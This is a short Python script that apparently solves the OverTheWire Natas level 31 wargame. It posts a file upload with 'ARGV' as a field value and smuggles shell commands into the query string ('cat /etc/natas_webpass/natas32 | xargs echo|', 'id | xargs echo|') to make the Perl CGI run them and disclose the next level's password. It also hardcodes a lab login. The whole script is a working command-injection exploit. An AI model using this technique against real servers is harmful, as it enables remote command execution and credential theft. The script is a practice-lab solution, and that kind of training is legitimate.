import requests

s = requests.Session()

url = "http://natas31.natas.labs.overthewire.org/index.pl?cat /etc/natas_webpass/natas32 | xargs echo|"
url = "http://natas31.natas.labs.overthewire.org/index.pl?id | xargs echo|"
s.auth = ('natas31', 'hay7aecuungiuKaezuathuk9biin0pu1')

data = {'file': 'ARGV'}
files = [('file', ('up.csv', b'a,b\n1,2'))]


print(s.post(url, data=data, files=files).text)